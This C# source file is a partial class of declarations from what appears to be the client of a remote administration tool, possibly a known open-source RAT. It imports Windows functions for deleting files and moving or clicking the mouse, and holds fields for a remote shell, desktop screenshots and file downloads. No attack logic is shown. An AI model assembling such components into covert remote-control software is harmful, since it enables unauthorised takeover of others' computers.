using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using xClient.Core.RemoteShell;
using xClient.Core.Helper;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN VARIABLES OR P/INVOKES NECESSARY FOR VARIOUS COMMANDS (if needed). */
    public static partial class CommandHandler
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteFile(string name);

        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        public static UnsafeStreamCodec StreamCodec;
        public static Bitmap LastDesktopScreenshot;
        private static Shell _shell;
        private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();

        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;
        private const string DELIMITER = "$E$";

        public enum UserStatus
        {
            Idle,
            Active
        }
        public enum ShutdownAction
        {
            Shutdown,
            Restart,
            Standby
        }
        public enum PathType
        {
            File,
            Directory,
            Back
        }
    }
}